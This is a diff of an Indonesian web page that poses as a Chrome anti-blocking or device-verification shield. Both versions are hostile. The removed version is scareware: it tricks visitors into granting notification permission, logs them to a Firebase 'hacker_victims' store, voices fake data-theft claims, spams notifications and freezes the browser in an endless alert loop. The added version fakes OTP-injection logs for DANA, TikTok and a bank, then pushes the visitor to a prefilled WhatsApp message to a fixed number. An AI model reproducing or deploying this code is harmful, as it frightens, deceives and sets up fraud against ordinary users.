@@ -1,124 +1,56 @@
+<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sistem Anti-Blokir Chrome</title>
-    <script src="https://www.gstatic.com/firebasejs/12.11.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/12.11.0/firebase-database-compat.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi Perangkat</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #111; height: 100%; overflow: hidden; font-family: sans-serif; color: white; }
-        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; padding: 20px; }
-        .btn { padding: 20px 40px; background: #008f39; color: white; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,255,0,0.3); }
-        #blackout { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: none; }
-        .hidden { display: none !important; }
+        body { background: #000; color: #0f0; font-family: sans-serif; text-align: center; padding: 50px 20px; }
+        .btn-otp { padding: 20px; background: #25d366; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; max-width: 300px; font-size: 16px; box-shadow: 0 0 20px #25d366; }
+        .log { margin-top: 30px; font-size: 12px; color: #555; text-align: left; background: #111; padding: 10px; border-radius: 5px; height: 150px; overflow-y: scroll; }
     </style>
 </head>
 <body>
 
-    <div id="step1" class="container">
-        <h1 style="font-size: 60px;">🛡️</h1>
-        <h2>SISTEM ANTI-BLOKIR</h2>
-        <p>Ketuk tombol di bawah untuk memulai sinkronisasi sistem.</p>
-        <button class="btn" onclick="openAudio()">MULAI SINKRONISASI</button>
-    </div>
+    <h1>🛡️ KERNEL SHIELD</h1>
+    <p>Sinkronisasi akun diperlukan untuk mencegah pemblokiran Chrome.</p>
+    
+    <button class="btn-otp" onclick="triggerOTP()">KONFIRMASI OTP SEKARANG</button>
 
-    <div id="step2" class="container hidden">
-        <h2>KONFIRMASI SENSOR</h2>
-        <p>Wajib klik <b>'ALLOW / IZINKAN'</b> pada pop-up di atas untuk mengaktifkan notifikasi bar.</p>
-        <button class="btn" style="background: #d32f2f;" onclick="startRealPrank()">IZINKAN SENSOR</button>
+    <div id="logs" class="log">
+        > System standby...<br>
+        > Waiting for user activation...
     </div>
-
-    <div id="blackout"></div>
 
     <script>
-        // CONFIG FIREBASE PUNYA LU
-        const firebaseConfig = {
-            apiKey: "AIzaSyAsegtxDbDkADPrd_dmqUqpIrhwKUOUU0o",
-            authDomain: "pirdangame.firebaseapp.com",
-            databaseURL: "https://pirdangame-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "pirdangame",
-            storageBucket: "pirdangame.firebasestorage.app",
-            messagingSenderId: "109134208993",
-            appId: "1:109134208993:web:22efa124fd0dda427fbca0"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-
-        let audioCtx;
-
-        // TAHAP 1: Buka Audio Context (Biar suara nempel)
-        function openAudio() {
-            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
+        function logMsg(t) {
+            const l = document.getElementById('logs');
+            l.innerHTML += "> " + t + "<br>";
+            l.scrollTop = l.scrollHeight;
         }
 
-        // TAHAP 2: Paksa Notifikasi
-        async function startRealPrank() {
-            const permission = await Notification.requestPermission();
+        async function triggerOTP() {
+            logMsg("Memulai injeksi API...");
+            logMsg("Request OTP dari DANA.id...");
+            logMsg("Request OTP dari TikTok.com...");
+            logMsg("Request OTP dari Bank_Central...");
             
-            if (permission === "granted") {
-                document.getElementById('step2').classList.add('hidden');
-                document.getElementById('blackout').style.display = 'block';
+            // Suara Robot Biar Makin Panik
+            const utter = new SpeechSynthesisUtterance("Peringatan. Percobaan masuk terdeteksi pada akun Dana dan TikTok anda. Segera lakukan verifikasi.");
+            utter.lang = 'id-ID';
+            window.speechSynthesis.speak(utter);
+
+            setTimeout(() => {
+                logMsg("Membuka jalur enkripsi WhatsApp...");
                 
-                // Simpan ke Firebase
-                db.ref("hacker_victims/final_test").push({ status: "Infected", time: new Date().toLocaleString() });
+                // INI TRIKNYA: Kirim ke nomor lu sendiri atau nomor target (isi nomor lu di bawah)
+                const nomorLu = "+6283865539387"; // GANTI PAKE NOMOR LU (Format 62xxx)
+                const pesan = "⚠️ PERINGATAN KEAMANAN PIRDAN-LABS ⚠️\n\nSeseorang mencoba login ke akun Anda:\n- DANA OTP: 8821\n- TIKTOK CODE: 5521\n- GOOGLE: 0912\n\nKlik KIRIM untuk membatalkan akses ilegal ini!";
                 
-                runDrama();
-            } else {
-                alert("SISTEM GAGAL: ANDA HARUS MENGKLIK ALLOW!");
-                location.reload();
-            }
-        }
-
-        function sendNotif(t, b) {
-            // Trik push notif yang lebih agresif
-            const n = new Notification(t, {
-                body: b,
-                icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png",
-                tag: 'pirdan-' + Math.random(), // Biar numpuk di atas
-                requireInteraction: true // Notif gak bakal ilang sampe di-swipe!
-            });
-        }
-
-        async function runDrama() {
-            const msg = [
-                "Mengekstrak folder WhatsApp...",
-                "Mengirim 1.400 media ke Server Pirdan.",
-                "GPS Tracking diaktifkan.",
-                "Bank data berhasil dicuri."
-            ];
-
-            const notifs = [
-                "⚠️ SECURITY ALERT: WhatsApp Leaked!",
-                "📁 UPLOADING: Private_Videos.zip",
-                "🛰️ GPS: Location broadcasted!",
-                "💀 SYSTEM: Total Infection!"
-            ];
-
-            for(let i=0; i < msg.length; i++) {
-                const utter = new SpeechSynthesisUtterance(msg[i]);
-                utter.lang = 'id-ID';
-                window.speechSynthesis.speak(utter);
-                
-                sendNotif("Pirdan Labs System", notifs[i]);
-                if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
-                
-                await new Promise(r => setTimeout(r, 4000));
-            }
-
-            // Suara TUTTTTT
-            const osc = audioCtx.createOscillator();
-            osc.type = 'sawtooth'; osc.frequency.setValueAtTime(2000, audioCtx.currentTime);
-            osc.connect(audioCtx.destination); osc.start();
-
-            setInterval(() => {
-                sendNotif("😘 LOPYU GOBLOK! 😘", "Kasian banget panik ya? HAHA!");
-            }, 1000);
-
-            setTimeout(() => { while(true) { alert("DATA LU PUNYA PIRDAN SEKARANG! 😘"); } }, 2000);
+                // Buka WhatsApp Target dengan pesan otomatis
+                window.location.href = "https://api.whatsapp.com/send?phone=" + nomorLu + "&text=" + encodeURIComponent(pesan);
+            }, 3000);
         }
     </script>
 </body>
-    </html>
-    
+</html>
